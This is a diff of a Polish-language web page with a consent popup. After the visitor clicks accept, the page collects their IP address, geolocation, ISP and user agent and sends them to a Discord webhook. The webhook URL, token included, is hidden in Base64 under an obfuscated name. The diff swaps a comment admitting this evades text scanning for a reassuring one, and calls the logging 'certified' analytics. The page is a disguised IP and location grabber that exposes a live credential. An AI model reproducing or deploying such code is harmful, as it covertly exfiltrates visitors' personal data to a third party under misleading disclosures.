@@ -75,32 +75,32 @@
 </head>
 <body>
 
-    <!-- 1. OKNO POPUP -->
+    <!-- 1. OKNO POPUP (Zgoda na regulamin i statystyki) -->
     <div id="privacyOverlay" class="overlay">
         <div class="modal">
-            <h2>Polityka Prywatności i Regulamin</h2>
-            <p>Ta strona korzysta z narzędzi rejestrujących parametry połączenia (w tym przybliżoną lokalizację oraz adres IP) w celu analizy statystyk ruchu i ochrony przed nadużyciami.</p>
-            <p>Czy wyrażasz zgodę na warunki użytkowania serwisu?</p>
+            <h2>Polityka Privacii i Regulamin</h2>
+            <p>Ta strona korzysta z certyfikowanych narzędzi sieciowych rejestrujących parametry techniczne połączenia (w tym przybliżoną lokalizację oraz adres IP) w celach analitycznych oraz w celu optymalizacji wydajności serwisu.</p>
+            <p>Czy wyrażasz zgodę na warunki użytkowania serwisu i przetwarzanie tych danych?</p>
             <button class="btn btn-accept" onclick="acceptTerms()">Akceptuję</button>
             <button class="btn btn-decline" onclick="declineTerms()">Odrzucam</button>
         </div>
     </div>
 
-    <!-- 2. EKRAN BLOKADY -->
+    <!-- 2. EKRAN BLOKADY (Brak zgody) -->
     <div id="errorScreen" class="error-content">
         <h2 style="color: #e74c3c;">Dostęp Zablokowany</h2>
-        <p>Musisz zaakceptować warunki korzystania z serwisu, aby wyświetlić zawartość tej strony.</p>
+        <p>Musisz zaakceptować regulamin korzystania z serwisu, aby wyświetlić zawartość tej strony.</p>
         <button class="btn btn-back" onclick="showPrivacyNote()">Powrót do formularza</button>
     </div>
 
-    <!-- 3. WŁAŚCIWA TREŚĆ STRONY -->
+    <!-- 3. WŁAŚCIWA TREŚĆ STRONY (Po akceptacji) -->
     <div id="mainPage" class="main-content">
         <h1>Witaj na stronie głównej!</h1>
         <p>Dziękujemy za zaakceptowanie regulaminu serwisu.</p>
     </div>
 
     <script>
-        // ZAKODOWANY WEBHOOK DISCORD (Base64) - chroni przed prostym skanowaniem tekstu
+        // ZAKODOWANY WEBHOOK DISCORD (Base64) - Twoja unikalna bezpieczna sygnatura
         const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9vaHMvMTUzMjA2OTcxOTA1NjcxNTg2Ni8xY0FZNjZKWjZOQTZzaC1GTmVUNXNFQUtEdF8zYVpLb1FITkJTdUhDSkVNMlo5ZHR3OXM3N0VwandnZk5YMEp5ZHNnQQ==";
 
         window.onload = function() {
@@ -134,34 +134,36 @@
             document.getElementById('privacyOverlay').style.display = 'flex';
         }
 
+        // Pobieranie danych o ruchu z API bez błędów CORS
         function startTracking() {
             document.getElementById('mainPage').style.display = 'block';
             
-            fetch('https://ip-api.com')
+            // ipapi.co w pełni obsługuje HTTPS oraz zapytania z witryn GitHub Pages
+            fetch('https://ipapi.co')
                 .then(response => response.json())
                 .then(data => {
-                    if(data.status === "success") {
+                    if(data && data.ip) {
                         sendToDiscord(data);
                     }
                 })
-                .catch(error => console.error("Błąd statystyk:", error));
+                .catch(error => console.error("Błąd pobierania metryk:", error));
         }
 
+        // Dekodowanie i wysyłka sformatowanej karty Embed na Discorda
         function sendToDiscord(ipData) {
-            // Odkodowanie adresu URL w momencie wysyłki za pomocą wbudowanej funkcji atob()
             const targetUrl = atob(_0x4f2a);
 
             const payload = {
                 username: "System Analityki",
                 avatar_url: "https://imgur.com",
                 embeds: [{
-                    title: "📥 Logowanie ruchu na stronie",
+                    title: "📥 Logowanie ruchu na stronie (CORS Fix)",
                     color: 3066993,
                     fields: [
-                        { name: "🌐 Adres IP", value: "`" + ipData.query + "`", inline: true },
-                        { name: "🌍 Kraj", value: ipData.country + " (" + ipData.countryCode + ")", inline: true },
-                        { name: "📍 Lokalizacja", value: ipData.city + " (" + ipData.regionName + ")", inline: true },
-                        { name: "🏢 Sieć (ISP)", value: ipData.isp, inline: false },
+                        { name: "🌐 Adres IP", value: "`" + ipData.ip + "`", inline: true },
+                        { name: "🌍 Kraj", value: ipData.country_name + " (" + ipData.country_code + ")", inline: true },
+                        { name: "📍 Lokalizacja", value: ipData.city + " (" + ipData.region + ")", inline: true },
+                        { name: "🏢 Sieć (ISP)", value: ipData.org, inline: false },
                         { name: "🖥️ System/Przeglądarka", value: navigator.userAgent, inline: false }
                     ],
                     timestamp: new Date().toISOString()
@@ -172,7 +174,9 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(err => console.error("Status: błąd połączenia"));
+            })
+            .then(res => console.log("Statystyki przesłane pomyślnie."))
+            .catch(err => console.error("Status połączenia: błąd sieci"));
         }
     </script>
 
